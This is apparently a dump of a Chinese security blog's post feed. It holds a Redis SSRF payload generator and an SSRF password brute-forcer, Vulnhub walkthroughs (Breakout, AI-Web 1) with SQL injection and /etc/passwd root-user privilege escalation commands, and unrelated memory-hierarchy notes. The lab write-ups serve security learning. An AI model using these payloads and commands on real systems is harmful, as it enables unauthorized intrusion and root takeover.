[<span class="string">&quot;flushall&quot;</span>,  </span><br><span class="line">    <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="built_in">format</span>(shell.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;$&quot;</span>)),  </span><br><span class="line">    <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="built_in">format</span>(path),  </span><br><span class="line">    <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="built_in">format</span>(filename),  </span><br><span class="line">    <span class="string">&quot;save&quot;</span>,  </span><br><span class="line">    <span class="string">&quot;quit&quot;</span>  </span><br><span class="line">    ]  </span><br><span class="line">    <span class="keyword">if</span> passwd:  </span><br><span class="line">    cmd.insert(<span class="number">0</span>, <span class="string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="built_in">format</span>(passwd))  </span><br><span class="line">    payload = protocol + ip + <span class="string">&quot;:&quot;</span> + port + <span class="string">&quot;/_&quot;</span>  </span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:  </span><br><span class="line">    payload+=urllib.parse.quote(redis_format(x))  </span><br><span class="line">    <span class="comment">#print(payload)  </span></span><br><span class="line">    <span class="built_in">print</span>(urllib.parse.quote(payload))</span><br></pre></td></tr></table></figure><h1 id="redis-有密码"><a href="#redis-有密码" class="headerlink" title="redis 有密码"></a>redis 有密码</h1><h4 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h4><p>直接就是使用msf  的 redis_login 模块</p><h4 id="hydra爆破"><a href="#hydra爆破" class="headerlink" title="hydra爆破"></a>hydra爆破</h4><h4 id="Redis-弱口令"><a href="#Redis-弱口令" class="headerlink" title="Redis 弱口令"></a>Redis 弱口令</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dict://serverip:port/命令:参数</span><br></pre></td></tr></table></figure><p>通过两次响应结果，可以确定 Redis 的密码为 123123，可以实现脚本爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> urllib.parse </span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://xx.xx.xx.xx:8000/ssrf.php?url=&quot;</span></span><br><span class="line"></span><br><span class="line">param = <span class="string">&#x27;dict://127.0.0.1:6788/auth:&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&#x27;d:\\test\\top100.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        passwd = f.readline()</span><br><span class="line">        all_url = url + param + passwd</span><br><span class="line">        <span class="comment"># print(all_url)</span></span><br><span class="line">        request = urllib.request.Request(all_url)</span><br><span class="line">        response = urllib.request.urlopen(request).read()</span><br><span class="line">        <span class="comment"># print(response)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;+OK\\r\\n+OK\\r\\n&quot;</span>.encode() <span class="keyword">in</span> response:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;redis passwd: &quot;</span> + passwd)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub-Breakout</title>
      <link href="/2024/07/14/Vulnhub-Breakout/"/>
      <url>/2024/07/14/Vulnhub-Breakout/</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th>机器信息</th><th>Breakout</th></tr></thead><tbody><tr><td>系统</td><td>Linux</td></tr><tr><td>详细信息</td><td>源代码存在密码  445 端口smb 爆破出来用户  可以得到 webmin 系统管理页面的账号密码可以直接getshell     本地tar命令存在cap  可以直接读取备份文件root密码</td></tr><tr><td></td><td></td></tr><tr><td></td><td></td></tr></tbody></table><h3 id="0x01信息收集"><a href="#0x01信息收集" class="headerlink" title="0x01信息收集"></a>0x01信息收集</h3><h4 id="0x02端口扫描"><a href="#0x02端口扫描" class="headerlink" title="0x02端口扫描"></a>0x02端口扫描</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">开放情况</span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2024-07-12 17:55 CST</span><br><span class="line">Nmap scan report for 192.168.49.128</span><br><span class="line">Host is up (0.00078s latency).</span><br><span class="line">Not shown: 995 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">80/tcp    open  http</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">10000/tcp open  snet-sensor-mgmt</span><br><span class="line">20000/tcp open  dnp</span><br><span class="line">MAC Address: 00:0C:29:55:B3:1A (VMware)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">指纹扫描</span><br><span class="line"></span><br><span class="line">netbios-ns://192.168.49.128:137 netbios-ns  Port:137</span><br><span class="line">Info:workgroup:WORKGROUP,Digest:&quot;CKAAAAAAAAAAAAAAAAAAAA,Length:229,Hostname:BREAKOUT,ProductName:Sambanmbdnetbios-ns&quot;</span><br><span class="line"></span><br><span class="line">http://192.168.49.128:80     </span><br><span class="line">Apache2DebianDefaultPage:Itworks FoundDomain:www.w3.org、httpd.apache.org、bugs.debian.org,Port:80</span><br><span class="line">FingerPrint:Apache2Debian默认页;Perl;Debian;Apache;Apachehttpd/2.4.51;Apachehttpd;v;(Debian),Digest:th:2px;\nborder-col,Length:11396</span><br><span class="line"></span><br><span class="line">netbios://192.168.49.128:139   netbios                    Version:4.6.2,DeviceType:v,Digest:&quot;%SMBr@@\x00\x00\x00% SM,Port:139,Length:41,ProductName:Sambasmbd&quot;</span><br><span class="line"></span><br><span class="line">smb://192.168.49.128:445       smb                        Port:445,Digest:00\x00\x00\x00\x00\x00\x,Length:77</span><br><span class="line"></span><br><span class="line">http://192.168.49.128:10000    200—Documentfollows       Digest:&quot;acktr:not(:first-child,Port:10000,FingerPrint:MiniServ/([\d.]+)\r\n|sp;MiniServ;Webminhttpd,Length:1779&quot;</span><br><span class="line"></span><br><span class="line">http://192.168.49.128:20000    200—Documentfollows       Length:474,Port:20000,Digest:&quot;runninginSSLmode.Tr&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="0x03-详细信息"><a href="#0x03-详细信息" class="headerlink" title="0x03 详细信息"></a>0x03 详细信息</h4><ol><li><p><strong>Port 80&#x2F;tcp</strong>:</p><ul><li>Service: HTTP</li><li>版本信息: Apache httpd 2.4.51 (Debian)</li><li>HTTP服务器标题: “Apache2 Debian Default Page: It works”</li><li>说明: 这是一个运行在Debian系统上的Apache HTTP服务器，版本为2.4.51。默认页面表明服务器已经正确配置并运行。</li><li><pre><code>- **Apache2DebianDefaultPage**: Apache2在Debian系统上的默认页面。</code></pre></li><li><strong>FoundDomain</strong>: 列出了一些发现的域名（<a href="http://www.w3.org/">www.w3.org</a>、<a href="http://httpd.apache.org/">httpd.apache.org</a>、<a href="http://bugs.debian.org/">bugs.debian.org</a>）。</li><li><strong>Port:80</strong>: 端口号80，HTTP服务的标准端口。</li><li><strong>FingerPrint</strong>: 指纹信息显示为Apache2在Debian上的配置，版本号为Apachehttpd&#x2F;2.4.51。</li></ul></li><li><p><strong>Port 139&#x2F;tcp</strong> 和 <strong>Port 445&#x2F;tcp</strong>:</p><ul><li>Service: NetBIOS-SSN (Samba)</li><li>版本信息: Samba smbd 4.6.2</li><li>说明: 这两个端口都显示为运行Samba的服务，版本为4.6.2。Samba用于提供文件和打印服务，允许与Windows网络进行互操作。</li><li><strong>smb</strong>: SMB服务的端口。</li><li><strong>Port:445</strong>: 端口号445，用于SMB服务（文件和打印共享）的标准端口。</li><li><pre><code>- **netbios**: NetBIOS服务的另一个端口。</code></pre></li><li><strong>Version</strong>: 版本号为4.6.2。</li><li><strong>DeviceType</strong>: 设备类型为v。</li><li><strong>ProductName</strong>: 产品名称为Sambasmbd。</li></ul></li><li><p><strong>Port 10000&#x2F;tcp</strong>:</p><ul><li>Service: HTTP</li><li>版本信息: MiniServ 1.981 (Webmin httpd)</li><li>HTTP服务器标题: “200 — Document follows”</li><li>说明: 这是一个运行在端口10000上的Webmin管理界面，版本为1.981。Webmin是一个用于管理Unix系统的Web界面工具。</li><li><ul><li><strong>200—Documentfollows</strong>: HTTP响应码200，表示请求成功。</li></ul></li><li><strong>Digest</strong>: 包含有关服务的信息，如端口号（10000）、指纹（MiniServ&#x2F;([\d.]+)）、服务类型（Webminhttpd）等。</li></ul></li><li><p><strong>Port 20000&#x2F;tcp</strong>:</p><ul><li>Service: HTTP</li><li>版本信息: MiniServ 1.830 (Webmin httpd)</li><li>HTTP服务器标题: “200 — Document follows”</li><li>说明: 另一个运行Webmin的端口，版本为1.830。同样用于Unix系统的管理。</li><li><ul><li><strong>200—Documentfollows</strong>: HTTP响应码200，表示请求成功。</li></ul></li><li><strong>Length</strong>: 返回的文档长度为474字节。</li><li><strong>Port:20000</strong>: 端口号20000。</li><li><strong>Digest</strong>: 包含了一些描述服务运行状态的信息，如运行在SSL模式下等。</li></ul></li></ol><p>其他信息还包括：</p><ul><li>MAC地址: 00:0C:29:55:B3:1A，指向VMware虚拟机的虚拟MAC地址。</li><li>设备类型: 通用设备，可能是一台通用用途的Linux主机。</li><li>运行系统细节: 运行Linux内核版本在4.15到5.6之间。</li></ul><h4 id="0x04-信息筛选"><a href="#0x04-信息筛选" class="headerlink" title="0x04 信息筛选"></a>0x04 信息筛选</h4><p>由于端口扫描可以得到相关信息</p><table><thead><tr><th>系统</th><th>Linux debian  运行Linux内核版本在4.15到5.6之间。</th></tr></thead><tbody><tr><td>中间件)</td><td>Apache httpd 2.4.51 (Debian)</td></tr><tr><td>139 端口 netbios 445端口</td><td>Samba smbd 4.6.2</td></tr><tr><td>10000  端口</td><td>MiniServ 1.981 (Webmin httpd)</td></tr><tr><td>20000 端口</td><td>MiniServ 1.830 (Webmin httpd)</td></tr></tbody></table><h3 id="0x10-渗透"><a href="#0x10-渗透" class="headerlink" title="0x10 渗透"></a>0x10 渗透</h3><table><thead><tr><th>445端口</th><th><a href="smb%20445.md">smb 445</a></th></tr></thead><tbody><tr><td></td><td></td></tr><tr><td>GG 扫不到445 一些共享目录 针对 samba找一些版本 漏洞</td><td></td></tr><tr><td>但是可以看到我们都无法利用</td><td></td></tr><tr><td>包括一些 webmin的unix的系统web管理平台 我们只能看到一些</td><td></td></tr><tr><td>框架但是都没有利用成功</td><td></td></tr><tr><td>之后看了wp之后才发现  在 主页 80端口有一个 brainfuck编码的</td><td></td></tr></tbody></table><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;++++++++++++++++.++++.&gt;&gt;+++++++++++++++++.----.&lt;++++++++++.-----------.&gt;-----------.++++.&lt;&lt;+.&gt;-.--------.++++++++++++++++++++.&lt;------------.&gt;&gt;---------.&lt;&lt;++++++.++++++.  </span><br></pre></td></tr></table></figure><p>解码之后可以得到密码  .2uqPEfj3D&lt;P’a-3<br>但是此时 我们可以看到 我们缺少用户<br>这时候只能是使用 enum4linux 去枚举一些可疑的用户了<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240712212604.png" alt="image.png"></p><h3 id="0x11"><a href="#0x11" class="headerlink" title="0x11"></a>0x11</h3><blockquote><p>***445 没有共享文件  那么只可能 是一个webmin中的一个 的登陆账号<br>在20000端口找到了</p></blockquote><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240713104407.png" alt="image.png"></p><p>这里有文件管理但是我写木马上不去  ，之后发现 他既然是个系统管理工具那么他必然就有终端</p><h4 id="0x20-post"><a href="#0x20-post" class="headerlink" title="0x20 post"></a>0x20 post</h4><blockquote><p>nc 打一个通道  直接进入</p></blockquote><p>getcap -r &#x2F;<br>可以看到由我们的老熟人 tar命令 </p><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240713105457.png" alt="image.png"></p><table><thead><tr><th>tar</th><th><a href="suid.md#tar%20of%20suid">tar of suid</a></th></tr></thead><tbody><tr><td>但是 带cap的 tar只能读取文件不可以直接提权</td><td></td></tr></tbody></table><h4 id="0x30-权限提升"><a href="#0x30-权限提升" class="headerlink" title="0x30 权限提升"></a>0x30 权限提升</h4><p>tar 命令读取  backup 目录下的 密码文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tar cvf 1.tar /var/backups/.old_pass.bak</span><br><span class="line">之后解压</span><br><span class="line">tar xf 1.tar 便可以看到文件</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240714102106.png" alt="image.png"></p><p>得到 root 密码<br>拿到权限 下机</p>]]></content>
      
      
      <categories>
          
          <category> 渗透靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub-Aiweb1</title>
      <link href="/2024/07/13/Vulnhub-Aiweb1/"/>
      <url>/2024/07/13/Vulnhub-Aiweb1/</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th>机器信息</th><th>vulnhub 靶场 AI-Web 1</th></tr></thead><tbody><tr><td>操作系统</td><td>linux</td></tr><tr><td>详细介绍</td><td>特训结业训练的 一个简单靶场，主要还是web的信息泄露和sql注入</td></tr><tr><td></td><td>sql注入碰巧又符合os-shell 可以拿到shell 之后就是一个简单的 passwd提权</td></tr></tbody></table><h1 id="0x00信息收集"><a href="#0x00信息收集" class="headerlink" title="0x00信息收集"></a>0x00信息收集</h1><h3 id="0x01循例端口扫描"><a href="#0x01循例端口扫描" class="headerlink" title="0x01循例端口扫描"></a>0x01循例端口扫描</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2024-07-06 11:24 CST</span><br><span class="line">Nmap scan report for 192.168.49.128</span><br><span class="line">Host is up (0.00021s latency).</span><br><span class="line">Not shown: 999 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 00:0C:29:23:04:32 (VMware)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">详细信息:</span></span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Apache httpd</span><br><span class="line">|_http-title: AI Web 1.0</span><br><span class="line">|_http-server-header: Apache</span><br><span class="line">| http-robots.txt: 2 disallowed entries </span><br><span class="line">|_/m3diNf0/ /se3reTdir777/uploads/</span><br><span class="line">MAC Address: 00:0C:29:23:04:32 (VMware)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="资产整理"><a href="#资产整理" class="headerlink" title="资产整理"></a>资产整理</h5><blockquote><p>系统:Linux<br>服务器:Apache(版本未知)<br>信息泄露: robots.txt<br>路径泄露: &#x2F;m3diNf0&#x2F;             &#x2F;se3reTdir777&#x2F;uploads&#x2F;</p></blockquote><blockquote><p>可以看出只有web资产</p></blockquote><h3 id="0x02扫描目录"><a href="#0x02扫描目录" class="headerlink" title="0x02扫描目录"></a>0x02扫描目录</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">+ http://192.168.49.128/index.html (CODE:200|SIZE:141)               </span><br><span class="line">+ http://192.168.49.128/robots.txt (CODE:200|SIZE:82)                </span><br><span class="line">+ http://192.168.49.128/server-status (CODE:403|SIZE:222) </span><br><span class="line"></span><br><span class="line">[11:48:08] 403 -  220B  - /.ht_wsr.txt</span><br><span class="line">[11:48:09] 403 -  223B  - /.htaccess.orig</span><br><span class="line">[11:48:09] 403 -  225B  - /.htaccess.sample</span><br><span class="line">[11:48:09] 403 -  223B  - /.htaccess.bak1</span><br><span class="line">[11:48:09] 403 -  223B  - /.htaccess.save</span><br><span class="line">[11:48:09] 403 -  223B  - /.htaccess_orig</span><br><span class="line">[11:48:09] 403 -  221B  - /.htaccess_sc</span><br><span class="line">[11:48:09] 403 -  221B  - /.htaccessBAK</span><br><span class="line">[11:48:09] 403 -  221B  - /.htaccessOLD</span><br><span class="line">[11:48:09] 403 -  222B  - /.htaccessOLD2</span><br><span class="line">[11:48:09] 403 -  213B  - /.htm</span><br><span class="line">[11:48:09] 403 -  214B  - /.html</span><br><span class="line">[11:48:09] 403 -  223B  - /.htpasswd_test</span><br><span class="line">[11:48:09] 403 -  220B  - /.httr-oauth</span><br><span class="line">[11:48:09] 403 -  219B  - /.htpasswds</span><br><span class="line">[11:48:10] 403 -  213B  - /.php</span><br><span class="line">[11:48:10] 403 -  224B  - /.htaccess_extra</span><br><span class="line">  err[11:49:00] 200 -   80B  - /robots.txt                                 </span><br><span class="line">[11:49:01] 403 -  222B  - /server-status</span><br><span class="line">[11:49:01] 403 -  223B  - /server-status/</span><br></pre></td></tr></table></figure><blockquote><p>可以看到 robots.txt 除此之外没有什么别的东西了</p></blockquote><p>403 了 这个url 因此<a href="http://192.168.49.128/m3diNf0/">http://192.168.49.128/m3diNf0/</a><br>继续递归扫描目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[14:57:12] 200 -   22KB - /m3diNf0/info.php </span><br></pre></td></tr></table></figure><p>一个信息泄露<br>再次挨个扫目录不能说毫无收获 只能说一无所获</p><h1 id="0x10-web"><a href="#0x10-web" class="headerlink" title="0x10 web"></a>0x10 web</h1><h4 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.49.128/m3diNf0/info.php</span><br><span class="line"></span><br><span class="line">没有猜错OS </span><br><span class="line">|7.2.19-0ubuntu0.18.04.2|</span><br></pre></td></tr></table></figure><h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.49.128/se3reTdir777</span><br></pre></td></tr></table></figure><p>联合查询 注入 而且感觉是一个回显注入</p><p>**poc</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select version(),2,3 </span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240706155145.png" alt="image.png"></p><p>**First Name: aiweb1user@localhost<br>Last Name: 5.7.42-0ubuntu0.18.04.1</p><h1 id="0x20-Get-shell"><a href="#0x20-Get-shell" class="headerlink" title="0x20 Get_shell"></a>0x20 Get_shell</h1><blockquote><p>目前就找到一个sql注入 根据sql注入做文章  先停止信息收集<br>最快可以getshell的只能是–os-shell<br>secure_file_priv 这个没在phpinfo()中查到<br>但是可以知道用户</p></blockquote><table><thead><tr><th>sqlmap 使用</th><th><a href="%E5%B8%B8%E8%A7%84%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/%E6%BC%8F%E6%B4%9E/sqlmap.md#%E9%AB%98%E6%9D%83%E9%99%90">高权限:</a></th></tr></thead><tbody><tr><td></td><td></td></tr><tr><td>怎么说呢 我现在觉得只能去盲猜测 secure…. 没被设置 但是我们还要找到一个 当前用户有权限的一些路径 才能上传 getshell  试了常规的 &#x2F;var&#x2F;www&#x2F;html  但是不行后来在</td><td></td></tr><tr><td>info.php 找到了根目录</td><td></td></tr><tr><td>&#x2F;home&#x2F;www&#x2F;html&#x2F;web1x443290o2sdf92213</td><td>但是也不行 只能试试uploads</td></tr></tbody></table><p>|&#x2F;home&#x2F;www&#x2F;html&#x2F;web1x443290o2sdf92213&#x2F;se3reTdir777&#x2F;uploads&#x2F;|</p><p>成功<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240706162859.png" alt="image.png"></p><h1 id="0x30-Post"><a href="#0x30-Post" class="headerlink" title="0x30 Post"></a>0x30 Post</h1><blockquote><p>第一步肯定是 linpeas 先上去扫一遍<br>怎么说呢….好像傻了一样 找了多攻击向量但是都用不成 后来才发现 passwd 是我自己的 文件<br>我可以执行 ….. 写操作果然还是不能把东西想的太高端  其实说实话还是要看到一个不能属主 属组 其他 就不看文件主人是谁</p></blockquote><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240706221859.png" alt="image.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt 123 123 </span><br><span class="line"></span><br><span class="line">echo &quot;tom:$1$123$nE5gIYTYiF1PIXVOFjQaW/:0:0:root:/root:/usr/bin/zsh&quot;</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt; /etc/passwd</span></span><br><span class="line"></span><br><span class="line">su tom </span><br></pre></td></tr></table></figure><p>拿到权限 ok 下机  —-</p>]]></content>
      
      
      <categories>
          
          <category> 渗透靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机组成原理_存储器</title>
      <link href="/2024/06/21/%E5%AD%98%E5%82%A8%E5%99%A8/"/>
      <url>/2024/06/21/%E5%AD%98%E5%82%A8%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240621110440.png"></p><h2 id="存储器构成"><a href="#存储器构成" class="headerlink" title="存储器构成"></a>存储器构成</h2><blockquote><p>材料一般是 半导体 或者磁性材料<br>存储位元 组成存储单元 组成存储器</p></blockquote><h4 id="sram-和dram"><a href="#sram-和dram" class="headerlink" title="sram 和dram"></a>sram 和dram</h4><p>***sram 速度快但是存储单元可能比较复杂因此<br>在密度和容量上比不上 存储单元简单的dram</p><h4 id="基本结构"><a href="#基本结构" class="headerlink" title="基本结构"></a>基本结构</h4><p>位就要看数据线的多少<br>一般来讲存储有地址线 数据线 片选信号 控制线相连接<br>地址线决定了   字多少<br>1kb&#x3D;2的10次方   mb gb依次类推<br>*表示为 1k * 8bit 这个为存储容量</p><h4 id="字扩展："><a href="#字扩展：" class="headerlink" title="字扩展："></a>字扩展：</h4><p>将芯片地址、片选和读写控制端相应并联，数据端分别引出<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240608154714.png" alt="image.png"></p><h4 id="位扩展："><a href="#位扩展：" class="headerlink" title="位扩展："></a>位扩展：</h4><p>将芯片的地址、数据、读写控制线相应并联、片选译码选择相应的片&#x2F;片组<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240608154727.png" alt="image.png"></p><h4 id="字位扩展："><a href="#字位扩展：" class="headerlink" title="字位扩展："></a>字位扩展：</h4><p>同时进行字扩展位扩展</p><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240608154744.png" alt="image.png"></p><h2 id="增加速度"><a href="#增加速度" class="headerlink" title="增加速度"></a>增加速度</h2><h3 id="芯片方面"><a href="#芯片方面" class="headerlink" title="芯片方面"></a>芯片方面</h3><h4 id="猝发"><a href="#猝发" class="headerlink" title="猝发"></a>猝发</h4><blockquote><p>一般来讲 就是访问一个地址时候 如果是需要访问连续的 一行 地址<br>那么只需要给出一个地址 之后的地址连续 自动跟出进行访问 </p></blockquote><h4 id="SDRAM-同步dram"><a href="#SDRAM-同步dram" class="headerlink" title="SDRAM 同步dram"></a>SDRAM 同步dram</h4><blockquote><p>其实就是 加了一个时钟 clk 把所有的流程在时钟控制下 进行了 一系列命令的编辑<br>使得 在处理器 在给出控制信号和地址信号时候可以 更快的获取数据 增加效率</p></blockquote><h4 id="CDRAM"><a href="#CDRAM" class="headerlink" title="CDRAM"></a>CDRAM</h4><blockquote><p>**单纯加了一个高速缓冲寄存器 cache  (sram) 因此可以看到一个<br>sram 里面保存了最近的一些数据 如果命中就可以不再访问dram<br>增加了速度</p></blockquote><h3 id="结构方面"><a href="#结构方面" class="headerlink" title="结构方面"></a>结构方面</h3><blockquote></blockquote><h5 id="并行存储器"><a href="#并行存储器" class="headerlink" title="并行存储器"></a>并行存储器</h5><h6 id="双端口存储器"><a href="#双端口存储器" class="headerlink" title="双端口存储器"></a>双端口存储器</h6><blockquote><p>个人看法 感觉有点像控制存取的并行 因为它提供了两个端口 一个左端口一个右端口<br>分别有两个完全一样的 地址总线 数据总线 控制总线<br>可以增加速度 不过发生冲突时候可能会有busy标志</p></blockquote><h6 id="多模块交叉存储器"><a href="#多模块交叉存储器" class="headerlink" title="多模块交叉存储器"></a>多模块交叉存储器</h6><blockquote><p>多模块意味着 是多个模块存储器并行   这就涉及到编址方式 一般是  顺序编址和交叉编址<br>一般就是 意味着 顺序编址 有一种串联 可扩展性 和一种互不干扰性质<br>相互不干扰可以并行访问极大的增加了效率</p></blockquote><h3 id="系统结构方面"><a href="#系统结构方面" class="headerlink" title="系统结构方面"></a>系统结构方面</h3><blockquote><p>cache    虚拟存储器 </p></blockquote><h2 id="cache"><a href="#cache" class="headerlink" title="cache"></a>cache</h2><h4 id="引入目的"><a href="#引入目的" class="headerlink" title="引入目的"></a>引入目的</h4><blockquote><p>解决主存和cpu访问速度不匹配的问题</p></blockquote><h5 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h5><p><strong>引入cache后CPU的访问流程</strong><br>当CPU发出读请求时，若访存地址在Cache中命中，就将此地址转换成Cache地址，直接对Cache进行读操作，与主存无关；若Cache不命中，则仍需访问主存，并把此字所在的块一次性地从主存调入Cache。若此时Cache已满，则需根据某种替换算法，用这个块替换Cache中原来的某块信息。整个过程全部由硬件实现。值得注意的是，<em><strong>CPU与Cache之间的数据交换以字为单位，而Cache与主存之间的数据交换则以Cache块为单位</strong></em>。<br><strong>注意</strong>：某些计算机中也采用同时访问Cache和主存的方式，若Cache命中，则主存访问终止；否则访问主存并替换Cache。<br>cache中又一个cam 是一个按照内容寻址的 存储器<br>cache 中是一行 每一行固定几个字一般来讲都是从主存拿相邻固定字长的数据进cache</p><h3 id="cache效率"><a href="#cache效率" class="headerlink" title="cache效率"></a>cache效率</h3><ol><li>***命中率</li></ol><p>cache次数 n1  和  主存次数n2<br>则可以知道命中率 h&#x3D;n1&#x2F;n1+n2<br>2. ***平均时间</p><p>这个需要 cache时间Ta和 主存时间Tm 